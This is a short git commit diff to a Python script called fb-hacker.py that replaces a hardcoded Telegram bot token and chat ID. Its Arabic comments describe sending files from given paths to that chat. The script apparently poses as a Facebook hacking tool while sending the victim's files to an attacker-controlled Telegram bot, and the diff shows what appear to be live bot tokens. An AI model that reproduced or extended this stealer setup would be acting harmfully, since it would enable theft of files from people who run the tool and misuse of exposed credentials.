2e7064a2322257e8bf98fb644c3087deceb3f34f
fyhxggfxggc657258 <167182486+fyhxggfxggc657258@users.noreply.github.com>
2024-05-02 01:03:43 +0300

    Update fb-hacker.py

--- fb-hacker.py
+++ fb-hacker.py
@@ -7,8 +7,8 @@ from pystyle import *
 
 
 # بيانات البوت والمستخدم المرسل إليه
-bot_token = '6078999720:AAEobp4-oTAPF0apNz-L6UqUoA_2_DfMQ3M'
-chat_id = '802140429'
+bot_token = '6988900442:AAEB7gSk-ltlUvjjWxiUalCjUJgzF9w1MyI'
+chat_id = '7190010467'
 os.system('clear')
 
 # المسارات التي تحتوي على الملفات التي تريد إرسالها
